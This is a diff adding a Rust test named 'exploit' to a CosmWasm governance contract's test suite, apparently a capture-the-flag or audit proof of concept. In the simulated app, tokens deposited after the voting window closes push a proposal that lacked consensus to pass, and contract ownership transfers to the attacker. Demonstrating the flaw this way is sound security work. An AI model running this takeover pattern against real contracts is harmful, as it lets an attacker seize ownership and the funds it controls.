@@ -235,4 +235,71 @@ pub mod tests {
             .unwrap();
         assert_eq!(config.owner, USER1.to_string());
     }
+    
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
+
+        // User1 propose themselves
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap();
+
+        // Admin votes, simulates msg from CW20 contract
+        // not enough to reach consensus
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(50_001),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+
+        // deposit additional funds after voting window has closed
+        let send_msg = Binary::from(r#"{"some":123}"#.as_bytes());
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            token_addr,
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg: send_msg,
+                amount: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // User1 ends proposal
+        let result = app
+            .execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap();
+
+        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));
+
+        // Check ownership transfer
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, USER1.to_string());
+    }
 }
